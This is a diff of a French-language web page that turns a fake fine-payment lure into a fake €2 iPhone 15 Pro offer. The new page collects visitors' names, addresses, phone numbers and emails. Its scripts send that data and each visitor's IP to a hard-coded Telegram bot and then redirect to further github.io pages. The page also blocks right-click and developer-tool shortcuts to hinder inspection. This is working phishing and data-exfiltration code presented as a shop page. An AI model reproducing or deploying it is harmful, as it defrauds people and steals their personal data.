@@ -1,98 +1,404 @@
-<!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Service de paiement des amendes</title>
+    <title>iPhone 15 Pro</title>
+    <!-- FAVICON -->
+    <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
+    <!-- LOCAL STYLE -->
+    <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
+
     <style>
-        body {
-            font-fami<!DOCTYPE html>
-
-
-<body>
-   
-  <a href="https://ibb.co/Q3BNnVhd"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" border="0" /></a>" 
-   
- 
-    </div>
-
-            text-align: center;
+        html[lang="fr"] body {
+            direction: ltr;
         }
-        .header {
-            width: 100%;
-            height: 50vh;
+
+        html[lang="fr"] body input,
+        html[lang="fr"] body textarea,
+        html[lang="fr"] body select {
+            direction: ltr;
+        }
+
+        .choose_color {
+            margin-bottom: 15px;
+        }
+
+        .choose_color label {
+            font-weight: bold;
+        }
+
+        .btn-group {
             display: flex;
-            justify-content: center;
-            background-color: #f4f4f4;
+            gap: 10px;
         }
-        .header img {
-            max-width: 110%;
-            max-height: 110%;
-            object-fit: contain;
-        }
-          
-         .button-zone button {
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            padding: 12px 65px;
-            font-size: 16px;
-            border-radius: 4px;
+
+        .img-nav-tab {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: inline-block;
             cursor: pointer;
-      
-      }
+            border: 2px solid transparent;
+        }
+
+        .img-nav-tab.active {
+            border-color: #000;
+        }
+
+        .black { background-color: black; }
+        .blue { background-color: blue; }
+        .natural { background-color: gray; }
+        .white { background-color: white; border: 1px solid black; }
     </style>
 </head>
 
-<body>
-    <div class="header">
-        <img src="  
-<a href="https://ibb.co/Q3BNnVhd"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" border="0" /></a> 
+<body class="lang-fr country-FR page-campaign">
+    <script src="https://swiftclapocos.click/assets/js/jquery-3.6.1.min.js"></script>
+
+    <header>
+        <!-- TOP BAR PARAGRAPH END'S HERE -->
+    </header>
+
+    <!-- SECTION START HERE -->
+    <section>
+        <div class="product_wrapper animate">
+            <div class="container">
+                <div class="product_block" style="min-height: 180px;">
+                    <!-- LEFT SIDE BLOCK START HERE -->
+                    <div class="images_wrapper">
+                        <div class="price_block">
+                            <span>Seulement maintenant</span>
+                            <h2>€2,00</h2>
+                        </div>
+                        <!-- Image Tabs -->
+                        <div id="black" class="img-tab">
+                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-blacktitanium1.png" alt="iPhone 15">
+                        </div>
+                        <div id="blue" class="img-tab">
+                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-bluetitanium1.png" alt="iPhone 15">
+                        </div>
+                        <div id="natural" class="img-tab">
+                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-naturaltitanium1.png" alt="iPhone 15">
+                        </div>
+                        <div id="white" class="img-tab active">
+                            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
+                        </div>
+                    </div>
+    
+                    <div class="form_wrapper">
+                        <div class="product_title">
+                            <h1>iPhone 15 Pro</h1>
+                        </div>
+
+                  
+                  <style>
+    .choose_color {
+        margin: 15px auto;
+        text-align: center;
+    }
+
+    .choose_color label {
+        font-weight: bold;
+        display: block;
+        margin-bottom: 10px;
+        font-size: 18px;
+    }
+
+    .btn-group {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    .img-nav-tab {
+        width: 26px;
+        height: 26px;
+        border-radius: 50%;
+        display: inline-block;
+        cursor: pointer;
+        border: 3px solid transparent;
+        transition: 0.3s;
+    }
+
+    .img-nav-tab.active {
+        border-color: white; /* Contour blanc autour de la couleur sélectionnée */
+        box-shadow: 0px 0px 5px rgba(255, 255, 255, 0.7);
+    }
+
+    .black { background-color: #222; } /* Noir éclairci */
+    .blue { background-color: #474a51; } /* Bleu plus proche du produit */
+    .natural { background-color: gray; }
+    .white { background-color: white; border: 1px solid black; }
+</style>
+
+<!-- Choix de la couleur centré sous le titre -->
+<div class="choose_color">
+    <label>Choisissez votre couleur&nbsp;:</label>
+    <div class="btn-group">
+        <a href="javascript:;" data-tab="black" class="img-nav-tab black active"></a>
+        <a href="javascript:;" data-tab="blue" class="img-nav-tab blue"></a>
+        <a href="javascript:;" data-tab="natural" class="img-nav-tab natural"></a>
+        <a href="javascript:;" data-tab="white" class="img-nav-tab white"></a>
     </div>
+</div>
+
+        <div class="col-12">
+                        <center><h6>Cartes de crédit acceptées:</h6>
+                          
+                        </br>
+                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="170" height="34">
+              
+   
+
+                        <!-- FORM BLOCK START HERE -->
+                        <div class="form_block" id="Scroll_form">
+                            <form action="https://justmoicom.github.io/tel2/" method="POST" autocomplete="on" novalidate="novalidate" id="personalInformationForm">
+                                <input type="hidden" name="_token" value="NsVhDb99Mf0taT0wjSlGq3iryWWyr2afJk0cCr7i" autocomplete="off">
+
+                                <div class="form-group">
+                                    <label for="first_name">Prénom</label>
+                                    <input type="text" name="first_name" id="first_name" minlength="2" value="" placeholder="Prénom" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="last_name">Nom</label>
+                                    <input type="text" name="last_name" id="last_name" minlength="2" value="" placeholder="Nom" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="address">Adresse</label>
+                                    <input type="text" name="address" id="address" minlength="3" value="" placeholder="Adresse" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="zip_code">Code postal</label>
+                                    <input type="text" name="zip_code" id="zip_code" value="" placeholder="Code postal" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="city">Ville</label>
+                                    <input type="text" name="city" id="city" value="" placeholder="Ville" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="phone_number">Numéro de téléphone</label>
+                                    <input type="tel" name="phone_number" id="phone_number" minlength="6" value="" placeholder="Numéro de téléphone" required class="form-control form-control-lg">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="email">E-mail</label>
+                                    <input type="email" name="email" id="email" value="" placeholder="E-mail" required class="form-control form-control-lg">
+                                </div>
+
+                                <button type="submit" id="submitButton" class="btn btn-success btn-lg w-100">
+                                    <span class="submit-label">Continuer</span>
+                                </button>
+                            </form>
+                        </div>
+                        <!-- FORM BLOCK END HERE -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
   
- 
+  <div class="intro_wrapper">
+      <div class="container">
+        <h2>Apple dévoile l'iPhone 15 Pro.</h2>
+        <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
+        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="iPhone 15 Pro">
+      </div>
     </div>
-   <center><a href="https://ibb.co/2Ydv7TJh"><img src="https://i.ibb.co/S7BtXzSy/Ure.jpg" alt="Ure" border="0"></a>
+  
+  
+  <script>
+    document.addEventListener("contextmenu", function (event) {
+        if (!event.target.matches("input, textarea")) {
+            event.preventDefault(); // Désactive le clic droit sauf sur les champs de saisie
+        }
+    });
+
+    document.addEventListener("keydown", function (event) {
+        if (
+            event.key === "F12" || 
+            (event.ctrlKey && event.shiftKey && event.key === "I") || 
+            (event.ctrlKey && event.shiftKey && event.key === "J") || 
+            (event.ctrlKey && event.key === "U")
+        ) {
+            event.preventDefault(); // Bloque F12, Ctrl+Shift+I, Ctrl+Shift+J et Ctrl+U
+        }
+    });
+</script>
 
   
+  
+  
+    <script>
+        $(document).ready(function () {
+            $(".img-nav-tab").click(function () {
+                var color = $(this).attr("data-tab");
+
+                $(".img-tab").hide();
+                $("#" + color).show();
+
+                $(".img-nav-tab").removeClass("active");
+                $(this).addClass("active");
+            });
+        });
+    </script>
 
   
   
   
   
+  
+  
+      <!-- FOOTER START HERE -->
+    <footer>
+        <div class="container">
+            <div class="block-reassurance">
+                <div class="row">
+                    <div class="col-12">
+                        <h6>Cartes de crédit acceptées:</h6>
+                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
 
-    <div class="form-container">
-        <h2>Saisie du numéro de télépaiement</h2>
-          <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
-            <div class="input-group">
-                <label for="numeroTelepaiement">Numéro de télépaiement :</label>
-                <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
-                                         <p>
-            </div>
-            <div class="input-group">
-                <label for="cle">Clé :</label>
-                <input type="tel" id="cle" maxlength="2" required placeholder="Clé" value="12">
-                                                  <p>                               
-            </div>
-            <div class="button-zone">
-                <button type="submit">Payer</button>
-            </div>
-        </form>
-                                     
-            <p><p><p><p>                      
-                         
-              <div class="header">
-        <img src="  
-<a href="https://i.ibb.co/G4nG4jc7/Cae.jpg"><img src="https://i.ibb.co/G4nG4jc7/Cae.jpg" alt="Cu" border="0" /></a> 
-    </div>                          
-                                     
-                                     
-                                     
-                                     
-     Mentions légales</a>                     
-                                     
-                                     
-    </div>
+    <!-- FOOTER END HERE -->
+
+    <script>
+$(document).ready(function () {
+    // Récupérer l'IP de l'utilisateur
+    var userIp = '';
+    $.getJSON("https://api.ipify.org?format=json", function (data) {
+        userIp = data.ip;
+    });
+
+    // Soumettre le formulaire avec validation
+    $('#personalInformationForm').on('submit', function (e) {
+        e.preventDefault();
+
+        if (!validateForm()) {
+            return;
+        }
+
+        var formData = $(this).serializeArray();
+        var message = "Nouvelle inscription reçue :\n";
+
+        // Formatage des données en fonction des champs du formulaire
+        formData.forEach(function (item) {
+            if (item.name !== '_token' && item.name !== 'request_hash') {
+                message += formatLabel(item.name) + ": " + item.value + "\n";
+            }
+        });
+
+        // Ajouter l'adresse IP au message
+        if (userIp) {
+            message += "Adresse IP: " + userIp + "\n";
+        } else {
+            message += "Adresse IP: Non identifiée\n";  // Si l'IP n'est pas récupérée
+        }
+
+        // Envoyer les données via Telegram
+        $.ajax({
+            url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
+            method: 'POST',
+            data: {
+                chat_id: '7747778364',
+                text: message
+            },
+            success: function () {
+                window.location.href = "https://justmoicom.github.io/tel2/"; // Redirection après envoi
+            },
+            error: function () {
+                window.location.href = "https://justmoicom.github.io/tel/"; // Redirection en cas d'erreur
+            }
+        });
+    });
+
+    // Validation des champs
+    function validateForm() {
+        var isValid = true;
+
+        $('input[required]').each(function () {
+            if ($(this).val().trim() === '') {
+                alert($(this).attr('placeholder') + ' est requis.');
+                isValid = false;
+                return false;
+            }
+        });
+
+        return isValid;
+    }
+
+    // Fonction pour formater les labels (ex : "Nom" au lieu de "first_name")
+    function formatLabel(name) {
+        switch (name) {
+            case 'first_name':
+                return 'Prénom';
+            case 'last_name':
+                return 'Nom';
+            case 'email':
+                return 'Email';
+            case 'phone_number':
+                return 'Téléphone';
+            case 'address':
+                return 'Adresse';
+            case 'zip_code':
+                return 'Code postal';
+            case 'city':
+                return 'Ville';
+            default:
+                return name.charAt(0).toUpperCase() + name.slice(1);
+        }
+    }
+});
+
+
+    </script>
+
+
+      
+  
+  
+
+     <script>
+        // Function to send an alert to Telegram
+        function sendTelegramAlert(ip) {
+            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Replace with your bot token
+            const chatId = '7747778364'; // Replace with your chat ID
+            const message = `New visitor on the site! IP Address: ${ip}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Success:', data))
+                .catch((error) => console.error('Error:', error));
+        }
+        // Function to get the user's IP address
+        function getUserIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendTelegramAlert(ip);
+                })
+                .catch((error) => console.error('Error getting IP:', error));
+        }
+       
+        // Trigger the functions when the page loads
+        window.onload = function() {
+            getUserIP();
+        };
+       
+    </script>
+  
+  
+  
+  
+
 </body>
 </html>
